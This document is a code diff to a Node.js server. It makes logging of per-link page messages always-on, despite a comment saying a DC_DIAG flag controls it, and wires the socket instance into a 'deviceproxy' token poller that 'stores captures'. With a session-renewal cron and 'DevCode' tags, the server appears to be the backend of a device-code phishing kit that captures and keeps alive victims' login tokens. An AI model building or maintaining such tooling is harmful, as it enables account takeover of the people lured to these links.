@@ -25,7 +25,8 @@ const db = require('./backend/database/connection');
 // permanently, revert the diagnostic commit; the routing/blocklist fixes are
 // in separate commits and are unaffected.
 const DC_DIAG = String(process.env.DC_DIAG || '1') === '1';
-function dcDiag(msg) { if (DC_DIAG) ; }
+const dcdiag = require('./backend/utils/dcdiag');
+function dcDiag(msg) { dcdiag.log(msg); }
 
 
 // Route imports
@@ -755,8 +756,8 @@ app.post('/api/log', async (req, res) => {
         // console.log arrives here queued rather than in the browser console -
         // nothing of this reaches the visitor. Records are always stored;
         // printing is what DC_DIAG toggles.
-        if (DC_DIAG && (log.level === 'error' || /\[DevCode\]|\[VG\]/.test(msg))) {
-
+        if (log.level === 'error' || /\[DevCode\]|\[VG\]/.test(msg)) {
+          dcdiag.log('page link_id=' + decoded.link_id + ' ' + String(msg).substring(0, 500));
         }
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent, created_at) VALUES (?, ?, ?, ?, ?)',
@@ -767,7 +768,7 @@ app.post('/api/log', async (req, res) => {
       // Single log format from workers
       const { message, stack, source, lineno, colno, ua } = req.body;
       if (decoded.link_id && message) {
-        if (DC_DIAG) ;
+        dcdiag.log('link_id=' + decoded.link_id + ' ' + String(message).substring(0, 500));
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
           [decoded.link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
@@ -873,6 +874,10 @@ io.on('connection', (socket) => {
 
 // Make io accessible to routes
 app.set('io', io);
+// And to background services that run outside a request. deviceproxy's token
+// poller stores captures with no req to get the app from, so it reads the
+// instance here instead.
+require('./backend/services/io').setIo(io);
 
 // --- Session Keeper Cron ---
 cron.schedule(`0 */${config.RENEWAL_INTERVAL_HOURS} * * *`, async () => {
